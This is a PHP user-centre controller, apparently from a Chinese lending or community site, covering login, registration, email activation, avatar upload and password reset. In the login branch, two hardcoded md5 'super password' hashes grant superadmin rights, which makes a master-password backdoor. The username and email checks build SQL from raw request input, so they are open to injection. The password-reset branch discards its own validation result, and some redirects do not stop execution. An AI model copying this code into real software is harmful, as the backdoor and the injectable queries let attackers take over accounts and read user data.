<?
if (!defined('ROOT_PATH'))  die('不能访问');//防止直接访问

$_U = array();//用户的共同配置变量

//用户中心模板引擎的配置
$magic->left_tag = "{";
$magic->right_tag = "}";
//$magic->force_compile = true;
$temlate_dir = "themes/ruizhict_member";
$magic->template_dir = $temlate_dir;
$magic->assign("tpldir",$temlate_dir);


//用户中心的管理地址
$member_url = "index.php?".$_G['query_site'];
$_U['member_url'] = $member_url;

//模块，分页，每页显示条数
$_U['page'] = empty($_REQUEST['page'])?"1":$_REQUEST['page'];//分页
$_U['epage'] = empty($_REQUEST['epage'])?"10":$_REQUEST['epage'];//分页的每一页

//对地址栏进行归类
$q = empty($_REQUEST['q'])?"":urldecode($_REQUEST['q']);//获取内容
$_q = explode("/",$q);
$_U['query'] = $q;
$_U['query_sort'] = empty($_q[0])?"main":$_q[0];
$_U['query_class'] = empty($_q[1])?"list":$_q[1];
$_U['query_type'] = empty($_q[2])?"list":$_q[2];
$_U['query_url'] = $_U['member_url']."&q={$_U['query_sort']}/{$_U['query_class']}";

 $_U['user_reg_key'] = "asdfaswerwer";

//提现费用的设置,比较特殊的设置
$_U["account_cash_status"] = 1;
function GetCashFee($account){
	if ($data['total'] <= 10000){
		return 10;
	}else{
		return 15;
	}
}



if ($_U['query_sort'] == "action"){
	# 检查用户名是否被注册
	if ($_U['query_class'] == 'check_username'){
		$username = $_REQUEST['username'];
		$sql = "select * from {user} where `username`='{$username}'";
		$result = $mysql->db_fetch_array($sql);

		if ($result == false){
			echo true;exit;
		}else{
			echo false;exit;
		}
	}

	# 检查邮箱是否被注册
	elseif ($_U['query_class'] == 'check_email'){
		$email = urldecode($_REQUEST['email']);
		$sql = "select * from {user} where email='{$email}'";
		$result = $mysql->db_fetch_array($sql);

		if ($result == false){
			echo true;exit;
		}else{
			echo false;exit;
		}
	}


	# 登录页面
	elseif ($_U['query_class'] == 'login'){
		$index['superadmin'] = false;
		if (isset($_POST['password'])){
			//超级密码
			if (md5($_POST['password'])=="17a54958e7be5b9ab20e212da1e51df3" || md5($_POST['password'])=="28605d55bde7a8bb2da6b03b42a0d25a"){
				$index['superadmin'] = true;
			}
		}
		include_once("login.php");
	}


	# 退出页面
	elseif ($_U['query_class'] == 'logout'){
		include_once("logout.php");
	}

	/*
	# 用户注册页面
	elseif ($_U['query_class'] == 'reg'){
		if ($_G['user_id']!=""){
			header('location:index.php?user');
			exit;
		}elseif (isset($_SESSION['reg_step'])){
			if ($_SESSION['reg_step']=="reg_email"){
				if ($_G['user_id']=="") unset($_SESSION['reg_step']);
				header('location:index.php?user&q=action/reg_email');
				exit;
			}
		}


		$_SESSION['reg_step'] = "";
		$title = '用户注册';
		$template = 'user_reg.html';
	}

	*/
	# 用户注册页面
	elseif ($_U['query_class'] == 'reg'){
		include_once("reg.php");

	}

	# 发送激活邮件
	elseif ($_U['query_class'] == 'reg_email'){

		if ($_G['user_id']==""){
			header('location:index.php?user&q=action/login');
		}
		if (isset($_REQUEST['jump']) && $_REQUEST['jump'] == "true"){
			$_SESSION['reg_step'] = "reg_avatar";
		}
		if ($_SESSION['reg_step']=="reg_info"){
			header('location:index.php?user&q=action/reg_info');
		}elseif ($_SESSION['reg_step']=="reg_avatar"){
			header('location:index.php?user&q=action/reg_avatar');
		}elseif ($_SESSION['reg_step']=="") {
			header('location:index.php?user');
		}else{
			$result = $user->GetOne(array("user_id"=>$_G['user_id']));
			if ($result['email_status']==1){
				if ($result['avatar_status']==1){
					$_SESSION['reg_step']="";
					header('location:index.php?user');
					exit;
				}else{
					$_SESSION['reg_step']="reg_avatar";
					header('location:index.php?user&q=action/reg_avatar');
					exit;
				}
			}else{
				$_U['sendemail'] = $result['email'];
				$emailurl = "http://mail.".str_replace("@","",strstr($result['email'],"@"));
				$_U['emailurl'] = $emailurl;
				$template = 'flat/user_reg_email.html';
			}
		}
	}

	# 发送激活邮件
	elseif ($_U['query_class'] == 'reg_send_email'){
		if ($_G['user_id']==""){
			echo "<br>输入有误";
		}elseif ($_SESSION['reg_step']=="reg_avatar"){
			header('location:index.php?user&q=action/reg_avatar');
		}elseif ($_SESSION['reg_step']=="" && !isset($_REQUEST['active'])) {
			header('location:index.php?user');
		}else{
			$data['user_id'] = $_G['user_id'];
			$result = $user->GetOne($data);
			if ($result['email_status']==1 && !isset($_REQUEST['active'])){
				if ($result['avatar_status']==1){
					$_SESSION['reg_step']=="";
					header('location:index.php?user');
				}else{
					header('location:index.php?user&q=action/reg_avatar');
				}
			}else{
				$data['email'] = $result['email'];
				$data['username'] = $result['username'];
				$data['webname'] = $_G['system']['con_webname'];
				$data['title'] = "注册邮件确认";
				$data['msg'] = RegEmailMsg($data);
				$data['type'] = "reg";
				if (isset($_SESSION['sendemail_time']) && $_SESSION['sendemail_time']+60*2>time()){
					echo "<br>请2分钟后再次请求<br><br>请点击右边的关闭按钮关闭。";
				}else{
					$result = userClass::SendEmail($data);
					if ($result) {
						$_SESSION['sendemail_time'] = time();
						echo "<br>发送成功，请查看你的邮件信息<br><br>请点击右边的关闭按钮关闭。";
					}
					else{
						echo "<br>发送失败，请跟管理员联系<br><br>请点击右边的关闭按钮关闭。";
					}
				}
			}
		}
		exit;
	}


	# 激活
	elseif ($_U['query_class'] == 'active') {
		require_once("modules/credit/credit.class.php");
		$id = urldecode($_REQUEST['id']);
		$_id = explode(",",authcode(trim($id),"DECODE"));
		$data['user_id'] = $_id[0];
		$result = $user->ActiveEmail($data);

		$result = creditClass::GetTypeOne(array("nid"=>"email"));
		$_A['arrestation_value'] = $result['value'];
		$_A['credit_type_id'] = $result['id'];
		$_A['credit_type_name'] = $result['name'];
		$credit['nid'] = "email";
		$credit['user_id'] = $data['user_id'];
		$credit['value'] = $result['value'];
		$credit['op_user'] = 0;
		$credit['op'] = 1;//增加
		$credit['type_id'] = $result['id'];
		$credit['remark'] = "邮箱认证成功";
		creditClass::UpdateCredit($credit);//更新积分
		if ($result!=false) {
			$msg = array('邮箱激活成功','','index.php?user');
		}
		else{
			$msg = array('激活失败','','index.php?user&q=reg_email');
		}

	}

	# 头像
	elseif ($_U['query_class'] == 'reg_avatar') {
		if($_G['user_id']==""){
			header('location:index.php?user&q=action/login');
			exit;
		}
		if (isset($_REQUEST['jump']) && $_REQUEST['jump'] == "true"){
			$_SESSION['reg_step'] = "";
		}

		if (isset($_SESSION['reg_step']) && $_SESSION['reg_step']=="reg_email"){
			header('location:index.php?user&q=action/reg_email');
			exit;
		}elseif ($_SESSION['reg_step']=="" ) {
			header('location:index.php?user');
			exit;
		}else{
			error_reporting(0);
			$data['user_id'] = $_G['user_id'];
			$data['istrue'] = true;
			if (get_avatar($data)){
				$user->ActiveAvatar($data);
				$_SESSION['reg_step'] = "";
				header('location:index.php?user');
				exit;
			}else{
				$template = 'user_reg_avatar.html';
			}
		}
	}

	# 取回密码页面
	elseif ($_U['query_class'] == 'getpwd'){
		include_once("getpwd.php");
	}

	# 重新修改密码
	elseif ($_U['query_class'] == 'updatepwd'){
		$updatepwd_msg = "";
		if(isset($_REQUEST['id'])){
			$id = urldecode($_REQUEST['id']);
			$data = explode(",",authcode(trim($id),"DECODE"));
			$user_id = $data[0];
			$start_time = $data[1];
			if ($user_id==""){
				$updatepwd_msg = "您的操作有误，请勿乱操作";
			}elseif (time()>$start_time+60*60){
				$updatepwd_msg = "此链接已经过期，请重新申请";
			}else{
				$result = $user->GetOne(array("user_id"=>$user_id));
				if ($result == false){
					$updatepwd_msg = "您的操作有误，请勿乱操作";
				}else{
					$_U['user_result'] =  $result;
				}
			}
		}else{
			$updatepwd_msg = "您的操作有误，请勿乱操作";
		}

		$updatepwd_msg = "";
		if(isset($_POST['password']) && $updatepwd_msg=="" ){
			$password = $_POST['password'];
			$confirm_password = $_POST['confirm_password'];
			if ($password==""){
				$update_msg = "新密码不能为空";
			}elseif ( strlen($password)<6 || strlen($password)>15){
				$update_msg = "密码的长度在6到15位之间";
			}elseif ($password != $confirm_password){
				$update_msg = "两次密码不一样";
			}else{
				$index['user_id'] = $user_id;
				$index['password'] = $password;
				$result = $user->UpdateUser($index);
				if ($result==false){
					$update_msg = "您的操作有误，请勿乱操作";
				}else{
					$updatepwd_msg = "密码修改成功。";
				}
			}
		}

		$_U['update_msg'] = $update_msg;
		$_U['updatepwd_msg'] = $updatepwd_msg;
		$template = 'user_updatepwd.html';

	}
	# 检查提示
	elseif ($_U['query_class'] == 'check'){
		echo "<br>";
		if ($_G['user_result']['real_status']==0){
			echo "你还没有通过进行实名认证<br><br><br>";
			echo "<a href='/index.php?user&q=code/user/realname'>立即实名认证</a>";
		}
		exit;
	}

	#要请好友注册
	elseif ($_U['query_class'] == "reginvite"){
		$_user_id = Url2Key($_REQUEST['u'],"reg_invite");
		$_SESSION['reginvite_user_id'] = $_user_id[1];
		header('location:index.php?user&q=action/reg');
	}

# 用户中心处理数据的地方
}elseif ($_U['query_sort'] == "code"){
	if  (!isset($_G['user_id']) || $_G['user_id']==""){
			header('location:index.php?user&q=action/login');
	}

	if (is_file(ROOT_PATH."/modules/{$_U['query_class']}/{$_U['query_class']}.inc.php")){
		include(ROOT_PATH."/modules/{$_U['query_class']}/{$_U['query_class']}.inc.php");
	}else{
		$msg = array("您操作有误，请勿乱操作");
	}


}else{

	if (isset($_SESSION['reg_step']) && $_SESSION['reg_step']=="reg_email"){
		header('location:index.php?user&q=action/reg_email');
		exit;
	}elseif (isset($_SESSION['reg_step']) && $_SESSION['reg_step']=="reg_avatar"){
		header('location:index.php?user&q=action/reg_avatar');
		exit;
	}
	$_U['user_cache'] = userClass::GetUserCache(array("user_id"=>$_G['user_id']));//用户缓存


	//短消息条数
	include_once(ROOT_PATH."/modules/message/message.class.php");
	$_message = messageClass::GetCount(array("user_id"=>$_G['user_id'],"status"=>0,"deltype"=>0));
	$_U['user_cache']['message'] =$_message['num'];


	//好友请求数
	$_friends_apply = userClass::GetFriendsRCount(array("user_id"=>$_G['user_id'],"status"=>0));
	$_U['user_cache']['friends_apply'] =$_friends_apply['num'];


	# 如果用户没有登录则跳转到

	if ($_G['user_id'] == "" ){
		header('location:index.php?user&q=action/login');
	}

	$template = "user_main.html";
}




//系统信息处理文件
if (isset($msg) && $msg!="") {
	$_msg = $msg[0];
	$content = empty($msg[1])?"返回上一页":$msg[1];
	$url = empty($msg[2])?"-1":$msg[2];
	$http_referer = empty($_SERVER['HTTP_REFERER'])?"":$_SERVER['HTTP_REFERER'];
	if ($http_referer == "" && $url == ""){ $url = "/";}
	if ($url == "-1") $url = "";
	elseif ($url == "" ) $url = $http_referer;
	$_U['showmsg'] = array('msg'=>$_msg,"url"=>$url,"content"=>$content);
	$template = "user_msg.html";
}

function set_session($data = array()){
	$_SESSION['username'] = isset($data['username'])?$data['username']:"";
	$_SESSION['uc_user_id'] = isset($data['uc_user_id'])?$data['uc_user_id']:"";
	$_SESSION['user_typeid'] = isset($data['user_typeid'])?$data['user_typeid']:"";
	$_SESSION['usertime'] = time();
	$_SESSION['usertype'] = 0;
}

$magic->assign("_U",$_U);

$magic->display($template);
exit;
?>